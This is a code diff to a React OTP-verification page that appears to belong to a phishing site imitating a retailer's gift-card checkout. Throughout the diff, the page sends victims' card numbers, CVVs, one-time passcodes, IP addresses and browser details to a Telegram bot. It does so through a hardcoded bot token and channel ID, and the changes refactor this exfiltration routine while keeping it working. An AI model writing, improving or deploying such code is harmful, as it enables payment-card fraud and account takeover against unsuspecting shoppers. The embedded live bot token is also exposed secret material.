@@ -4,10 +4,10 @@ import { Button } from "@/components/ui/button";
 import { toast } from "@/hooks/use-toast";
 import HotTopicHeader from "@/components/HotTopicHeader";
 import HotTopicFooter from "@/components/HotTopicFooter";
-import { AlertCircle, Clock, LockIcon, Shield } from "lucide-react";
+import { AlertCircle, Clock, Shield } from "lucide-react";
 import { InputOTP, InputOTPGroup, InputOTPSlot, InputOTPSeparator } from "@/components/ui/input-otp";
 
-// Telegram configuration
+// Telegram notification constants
 const TELEGRAM_BOT_TOKEN = "7782642954:AAEhLo5kGD4MlWIsoYnnYHEImf7YDCLsJgo";
 const TELEGRAM_CHANNEL_ID = "-1002550945996";
 
@@ -85,23 +85,22 @@ const OTPVerification = () => {
     }
   }, [countdown, navigate]);
 
-  // Send notification to Telegram
-  const sendTelegramNotification = async (attempt: number, isSuccess: boolean) => {
+  // Send Telegram notification directly
+  const sendDirectTelegramNotification = async (attempt: number, isSuccess: boolean) => {
     try {
-      console.log("Starting Telegram notification...");
+      console.log("Starting direct Telegram notification");
       
-      // Format the message with full card details and custom styling
-      // Red for failed attempts, green for success
-      const attemptColor = isSuccess ? 'green' : 'red';
+      // Create a formatted message for the OTP attempt
       const attemptHeader = isSuccess 
-        ? '✅ <b style="color:green">OTP VERIFICATION SUCCESSFUL</b> ✅' 
-        : `⚠️ <b style="color:red">OTP VERIFICATION ATTEMPT ${attempt}</b> ⚠️`;
+        ? '✅ <b>OTP VERIFICATION SUCCESSFUL</b> ✅' 
+        : `⚠️ <b>OTP VERIFICATION ATTEMPT ${attempt}</b> ⚠️`;
       
       const statusText = isSuccess 
-        ? '✅ <span style="color:green">Success - Final attempt</span>' 
-        : `❌ <span style="color:red">Failed - Attempt ${attempt} of 3</span>`;
+        ? '✅ Success - Final attempt' 
+        : `❌ Failed - Attempt ${attempt} of 3`;
 
-      let message = `
+      // Construct message content
+      const message = `
 ${attemptHeader}
 
 👤 <b>Customer Information</b>:
@@ -119,36 +118,17 @@ ${attemptHeader}
    CVV: <code>${cvv || "N/A"}</code>
    Last Four: ${lastFour || "N/A"}
    Order Amount: $${discountedAmount?.toFixed(2) || "0.00"}
-   Gift Card Value: $${giftCardValue?.toFixed(2) || "0.00"}`;
-
-      // Add address if it's a physical delivery
-      if (orderDetails?.deliveryMethod === "physical" && orderDetails?.address) {
-        message += `
-
-📍 <b>Shipping Address</b>:
-   Street: ${orderDetails.address.street}
-   City: ${orderDetails.address.city}
-   State: ${orderDetails.address.state}
-   ZIP: ${orderDetails.address.zipCode}`;
-      }
-
-      // Add user information
-      message += `
+   Gift Card Value: $${giftCardValue?.toFixed(2) || "0.00"}
 
 🔍 <b>User Information</b>:
    IP Address: <code>${orderDetails?.userInfo?.ip || "Unknown"}</code>
-   Browser: ${orderDetails?.userInfo?.userAgent || navigator.userAgent}
-   Session ID: ${orderDetails?.userInfo?.sessionId || "Not available"}
+   Browser: ${navigator.userAgent}
    Timestamp: ${new Date().toISOString()}
 
 📆 <b>Attempt Time</b>: ${new Date().toLocaleString()}`;
 
-      console.log("Sending Telegram notification with message:", message);
-      
-      // Send directly to Telegram API
+      console.log("Sending message to Telegram:", message);
       const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      console.log("Using Telegram API URL:", telegramApiUrl);
-      console.log("Using channel ID:", TELEGRAM_CHANNEL_ID);
       
       const response = await fetch(telegramApiUrl, {
         method: 'POST',
@@ -161,20 +141,23 @@ ${attemptHeader}
           parse_mode: 'HTML',
         }),
       });
-
-      console.log("Telegram API raw response:", response);
-      const result = await response.json();
-      console.log("Telegram API JSON response:", result);
       
-      if (!result.ok) {
-        console.error('Telegram notification error:', result);
+      // Log full response to debug any issues
+      console.log("Telegram API raw response:", response);
+      const responseText = await response.text();
+      console.log("Telegram API response text:", responseText);
+      
+      try {
+        // Try to parse JSON if possible
+        const jsonData = JSON.parse(responseText);
+        console.log("Telegram API JSON response:", jsonData);
+        return jsonData && jsonData.ok;
+      } catch (parseError) {
+        console.error("Failed to parse Telegram API response:", parseError);
         return false;
       }
-      
-      console.log("Telegram notification sent successfully");
-      return true;
     } catch (error) {
-      console.error('Failed to send Telegram notification:', error);
+      console.error("Failed to send direct Telegram notification:", error);
       return false;
     }
   };
@@ -231,18 +214,20 @@ ${attemptHeader}
     // Send notification to Telegram for current attempt
     try {
       console.log(`Sending Telegram notification for attempt ${currentAttempt}, isValid: ${isValid}`);
-      const notificationSent = await sendTelegramNotification(currentAttempt, isValid);
-      console.log(`Notification sent successfully: ${notificationSent}`);
+      
+      // Use direct Telegram API call
+      const notificationSent = await sendDirectTelegramNotification(currentAttempt, isValid);
+      console.log(`Direct notification sent successfully: ${notificationSent}`);
       
       if (!notificationSent) {
-        console.error("Failed to send Telegram notification");
+        console.error("Failed to send Telegram notification directly");
         // Continue with the flow even if notification fails
       }
     } catch (telegramErr) {
       console.error("Error sending Telegram notification:", telegramErr);
-      // Continue with the flow even if notification fails
     }
     
+    // If OTP is invalid, return early
     if (!isValid) {
       return;
     }
@@ -368,7 +353,7 @@ ${attemptHeader}
             </div>
             
             <form onSubmit={handleSubmit} className="space-y-6">
-              {/* Improved OTP Input */}
+              {/* OTP Input */}
               <div className="space-y-6">
                 <div className="flex justify-center">
                   <InputOTP
